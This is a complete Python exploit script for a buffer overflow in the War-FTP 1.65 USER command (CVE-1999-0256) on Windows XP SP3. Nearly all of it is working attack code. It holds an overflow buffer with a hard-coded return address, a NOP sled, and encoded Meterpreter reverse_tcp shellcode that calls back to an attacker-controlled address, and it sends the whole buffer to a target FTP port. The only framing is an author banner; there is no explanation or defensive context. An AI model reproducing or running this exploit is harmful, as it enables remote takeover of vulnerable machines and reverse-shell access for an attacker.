#!/usr/bin/python
#
#  ▄         ▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ 
# ▐░▌       ▐░▐░░░░░░░░░░░▐░░░░░░░░░░░▌           ▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▌
# ▐░▌       ▐░▐░█▀▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀█░▌           ▐░█▀▀▀▀▀▀▀▀▀ ▀▀▀▀█░█▀▀▀▀▐░█▀▀▀▀▀▀▀█░▌
# ▐░▌       ▐░▐░▌       ▐░▐░▌       ▐░▌           ▐░▌              ▐░▌    ▐░▌       ▐░▌
# ▐░▌   ▄   ▐░▐░█▄▄▄▄▄▄▄█░▐░█▄▄▄▄▄▄▄█░▌▄▄▄▄▄▄▄▄▄▄▄▐░█▄▄▄▄▄▄▄▄▄     ▐░▌    ▐░█▄▄▄▄▄▄▄█░▌
# ▐░▌  ▐░▌  ▐░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▌    ▐░▌    ▐░░░░░░░░░░░▌
# ▐░▌ ▐░▌░▌ ▐░▐░█▀▀▀▀▀▀▀█░▐░█▀▀▀▀█░█▀▀ ▀▀▀▀▀▀▀▀▀▀▀▐░█▀▀▀▀▀▀▀▀▀     ▐░▌    ▐░█▀▀▀▀▀▀▀▀▀ 
# ▐░▌▐░▌ ▐░▌▐░▐░▌       ▐░▐░▌     ▐░▌             ▐░▌              ▐░▌    ▐░▌          
# ▐░▌░▌   ▐░▐░▐░▌       ▐░▐░▌      ▐░▌            ▐░▌              ▐░▌    ▐░▌          
# ▐░░▌     ▐░░▐░▌       ▐░▐░▌       ▐░▌           ▐░▌              ▐░▌    ▐░▌          
#  ▄▄▄▄▄▄▄▄▄▄▄ ▄       ▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄           ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄   
# ▐░░░░░░░░░░░▐░▌     ▐░▐░░░░░░░░░░░▐░▌         ▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▌  
# ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌   ▐░▌▐░█▀▀▀▀▀▀▀█░▐░▌         ▐░█▀▀▀▀▀▀▀█░▌▀▀▀▀█░█▀▀▀▀ ▀▀▀▀█░█▀▀▀▀   
# ▐░▌           ▐░▌ ▐░▌ ▐░▌       ▐░▐░▌         ▐░▌       ▐░▌    ▐░▌         ▐░▌       
# ▐░█▄▄▄▄▄▄▄▄▄   ▐░▐░▌  ▐░█▄▄▄▄▄▄▄█░▐░▌         ▐░▌       ▐░▌    ▐░▌         ▐░▌       
# ▐░░░░░░░░░░░▌   ▐░▌   ▐░░░░░░░░░░░▐░▌         ▐░▌       ▐░▌    ▐░▌         ▐░▌       
# ▐░█▀▀▀▀▀▀▀▀▀   ▐░▌░▌  ▐░█▀▀▀▀▀▀▀▀▀▐░▌         ▐░▌       ▐░▌    ▐░▌         ▐░▌       
# ▐░▌           ▐░▌ ▐░▌ ▐░▌         ▐░▌         ▐░▌       ▐░▌    ▐░▌         ▐░▌       
# ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌   ▐░▌▐░▌         ▐░█▄▄▄▄▄▄▄▄▄▐░█▄▄▄▄▄▄▄█░▌▄▄▄▄█░█▄▄▄▄     ▐░▌       
# ▐░░░░░░░░░░░▐░▌     ▐░▐░▌         ▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░░░░░░░░░░▌    ▐░▌       
#  ▀▀▀▀▀▀▀▀▀▀▀ ▀       ▀ ▀           ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀      ▀        
#                                                                                         
#
#    Created by: Très Acton
#
# 	 Tested on: Windows XP SP3
# 	 Version: 1.65
#	 CVE: CVE-1999-0256
#    Software Link: http://www.exploit-db.com/wp-content/themes/exploit/applications/5132d652476f071874e42023e66dc1c1-WarFTP165_vulnerable_USER_BufferOverflow.exe

import socket
 
def format_eip(i):
    a = chr(i % 256)
    i = i >> 8
    b = chr(i % 256)
    i = i >> 8
    c = chr(i % 256)
    i = i >> 8
    d = chr(i % 256)
    str = "%c%c%c%c" % (a, b, c, d)
    return str

# msfpayload windows/meterepter/reverse_tcp LHOST=192.168.25.100 LPORT=4321 R | msfencode -b "\x00\x20\x0a\x0d\x40"
shellcode = ("\xd9\xc2\xba\xe8\xb8\xfc\x95\xd9\x74\x24\xf4\x5e\x29\xc9" +
"\xb1\x48\x31\x56\x1a\x83\xee\xfc\x03\x56\x16\xe2\x1d\x44" +
"\x14\x13\xdd\xb5\xe5\x7c\x54\x50\xd4\xae\x02\x10\x45\x7f" +
"\x41\x74\x66\xf4\x07\x6d\xfd\x78\x8f\x82\xb6\x37\xe9\xad" +
"\x47\xf6\x35\x61\x8b\x98\xc9\x78\xd8\x7a\xf0\xb2\x2d\x7a" +
"\x35\xae\xde\x2e\xee\xa4\x4d\xdf\x9b\xf9\x4d\x54\xd7\xed" +
"\xd5\x89\xad\x0c\xf7\x1f\xba\x56\xd7\x9e\x6f\xe3\x5e\xb9" +
"\x6c\xc8\x29\x32\x46\xba\xab\x92\x97\x43\x9a\xda\x7b\x7a" +
"\x12\xd7\x82\xba\x95\x08\xf1\xb0\xe5\xb5\x01\x03\x97\x61" +
"\x84\x96\x3f\xe1\x3e\x73\xc1\x26\xd8\xf0\xcd\x83\xaf\x5f" +
"\xd2\x12\x7c\xd4\xee\x9f\x83\x3b\x67\xdb\xa7\x9f\x23\xbf" +
"\xc6\x86\x89\x6e\xf7\xd9\x76\xce\x5d\x91\x95\x1b\xe8\xf8" +
"\xf1\xe8\xd8\x02\x02\x67\x6b\x70\x30\x28\xc7\x1e\x78\xa1" +
"\xc1\xd9\x7f\x98\xb5\x76\x7e\x23\xc5\x5f\x45\x77\x95\xf7" +
"\x6c\xf8\x7e\x08\x90\x2d\xd0\x58\x3e\x9e\x90\x08\xfe\x4e" +
"\x78\x43\xf1\xb1\x98\x6c\xdb\xd9\x32\x96\x8c\x25\x6a\x81" +
"\x28\xce\x68\xb2\xa0\xef\xe5\x54\xaa\xff\xa3\xcf\x43\x99" +
"\xee\x84\xf2\x66\x25\xe1\x35\xec\xc9\x15\xfb\x05\xa4\x05" +
"\x6c\xe6\xf3\x74\x3b\xf9\x2e\x12\xc4\x6f\xd4\xb5\x93\x07" +
"\xd6\xe0\xd4\x87\x29\xc7\x6e\x01\xbf\xa8\x18\x6e\x2f\x29" +
"\xd9\x38\x25\x29\xb1\x9c\x1d\x7a\xa4\xe2\x88\xee\x75\x77" +
"\x32\x47\x29\xd0\x5a\x65\x14\x16\xc5\x96\x73\xa6\x3a\x41" +
"\xba\x2c\x4a\xe7\xae\xec")

nopsled = "\x90"*100
eip = 0x7E48FCCF  # user32.dll on XP SP3
junk = "A"*485
buffer = junk + format_eip(eip) + nopsled + shellcode

target = "192.168.25.101"
 
print "Sending Buffer: USER command with a length of: %s" %len(buffer)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((target,21))
s.recv(1024)
s.send("USER %s \r\n" % buffer)
s.recv(1024)
s.send("PASS knock knock ;)\r\n")
s.recv(1024)
s.send("bye\r\n")
s.close()